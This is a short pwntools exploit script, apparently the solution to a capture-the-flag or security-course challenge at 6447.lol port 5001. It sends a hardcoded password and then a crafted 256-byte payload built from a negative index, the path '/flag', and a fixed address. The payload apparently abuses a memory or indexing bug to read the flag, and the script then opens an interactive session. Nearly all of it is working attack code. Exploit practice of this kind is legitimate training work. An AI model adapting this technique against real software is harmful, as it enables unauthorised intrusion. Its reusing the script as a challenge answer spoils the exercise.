#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 5001

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
### Miscellaneous Helper Functions ###
######################################

def runner(send):
    P.recvuntil(b'$ ', drop=True)
    if(send in ['0', '1', '2', '3']):
        P.sendline(send.encode())

######################################
############## Exploit ###############
######################################

def exploit():
    P.recvuntil(b'$ ', drop=True)
    P.sendline(b'password123')
    payload = b"-14" + b'a'*13 # 16 bytes
    payload += b'/flag' + b'\0' * 11 # 16 bytes
    payload += b"\xf2\xff\xff\xff\x00\x00\x00\x00" # 8 bytes
    payload += p64(0x404090) # 8 bytes
    payload += b'\0' * (256 - len(payload)) # another 13 chunks of 16 bit sized blocks
    P.sendline(payload)
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
